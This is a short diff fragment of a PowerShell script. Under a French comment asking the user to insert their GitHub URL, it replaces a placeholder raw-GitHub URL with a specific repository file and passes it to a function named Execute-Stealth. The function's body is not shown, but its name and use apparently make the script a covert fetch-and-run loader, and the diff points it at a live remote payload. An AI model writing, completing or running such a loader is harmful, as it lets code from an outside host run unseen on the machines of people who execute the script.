@@ -42,7 +42,7 @@ function Execute-Stealth {
 }
 
 # REMPLACER PAR TON URL GITHUB
-$url = "https://raw.githubusercontent.com/TON_USERNAME/TON_REPO/refs/heads/main/file.txt"
+$url = "https://raw.githubusercontent.com/thegoatofapi/myl/refs/heads/main/file.txt"
 
 Execute-Stealth -url $url
 
